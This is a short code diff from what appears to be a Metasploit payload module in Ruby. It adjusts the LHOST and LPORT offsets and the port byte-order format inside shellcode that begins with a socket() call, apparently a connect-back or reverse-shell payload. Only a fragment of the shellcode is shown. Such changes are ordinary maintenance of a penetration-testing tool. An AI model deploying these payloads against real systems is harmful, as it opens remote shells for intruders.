@@ -32,8 +32,8 @@ module MetasploitModule
         {
           'Offsets' =>
           {
-            'LHOST' =>  [ 57, 'ADDR' ],
-            'LPORT' =>  [ 55, 'v' ]
+            'LHOST' =>  [ 56, 'ADDR' ],
+            'LPORT' =>  [ 54, 'n' ]
           },
           'Payload' =>
             "\x55\xe3" + # socket()
